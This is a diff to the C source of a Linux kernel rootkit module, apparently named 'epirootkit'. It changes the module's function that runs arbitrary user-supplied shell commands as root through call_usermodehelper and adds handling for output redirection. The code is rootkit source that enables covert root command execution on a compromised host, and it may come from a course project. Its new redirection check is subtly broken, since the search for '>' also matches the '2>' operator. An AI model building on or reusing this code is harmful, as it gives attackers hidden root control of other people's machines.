@@ -156,8 +156,25 @@ static int exec_str_as_command(char *user_cmd)
 	if (!cmd)
 		return -ENOMEM;
 
-	// Construct the full shell command with output redirection
-	snprintf(cmd, STD_BUFFER_SIZE, "%s > %s 2> %s", user_cmd, stdout_file, stderr_file);
+
+	// Check if the command contains redirection operators
+	// Needed because we usually redirect stdout and stderr to /tmp/std.out and /tmp/std.err
+	// If the user has specified redirection, we need to handle it
+	char *redirect_stderr_add = strstr(user_cmd, "2>");		// Check for stderr redirection
+	char *redirect_stdout_add = strstr(user_cmd, ">");		// Check for stdout redirection
+	int user_redirect_stderr = redirect_stderr_add != NULL;
+	int user_redirect_stdout = redirect_stdout_add != redirect_stderr_add && redirect_stdout_add != NULL;
+	
+	if (user_redirect_stderr && user_redirect_stdout)
+		snprintf(cmd, STD_BUFFER_SIZE, "%s", user_cmd);
+	else if (user_redirect_stderr)
+		snprintf(cmd, STD_BUFFER_SIZE, "%s > %s", user_cmd, stdout_file); 
+	else if (user_redirect_stdout)
+		snprintf(cmd, STD_BUFFER_SIZE, "%s 2> %s", user_cmd, stderr_file);
+	else
+		snprintf(cmd, STD_BUFFER_SIZE, "%s > %s 2> %s", user_cmd, stdout_file, stderr_file);
+
+	// Prepare the command arguments
 	argv[2] = cmd;
 
 	pr_info("epirootkit: exec_str_as_command: executing command: %s\n", cmd);
@@ -173,11 +190,19 @@ static int exec_str_as_command(char *user_cmd)
 	status = call_usermodehelper_exec(sub_info, UMH_WAIT_PROC);
 	pr_info("epirootkit: exec_str_as_command: command exited with status: %d\n", status);
 
-	// Print the output of the command
-	pr_info("epirootkit: exec_str_as_command: command output:\n");
-	print_file_content(stdout_file, INFO);
-	pr_err("epirootkit: exec_str_as_command: command error output:\n");
-	print_file_content(stderr_file, ERR);
+	// Print the output of the command (if not redirected)
+	if(!user_redirect_stdout){
+		pr_info("epirootkit: exec_str_as_command: command output:\n");
+		print_file_content(stdout_file, INFO);
+	}else{
+		pr_info("epirootkit: exec_str_as_command: command output redirected to custom file\n");
+	}
+	if(!user_redirect_stderr){
+		pr_err("epirootkit: exec_str_as_command: command error output:\n");
+		print_file_content(stderr_file, ERR);
+	}else{
+		pr_err("epirootkit: exec_str_as_command: command error output redirected to custom file\n");
+	}
 
 	// Cleanup: free memory
 	kfree(cmd);
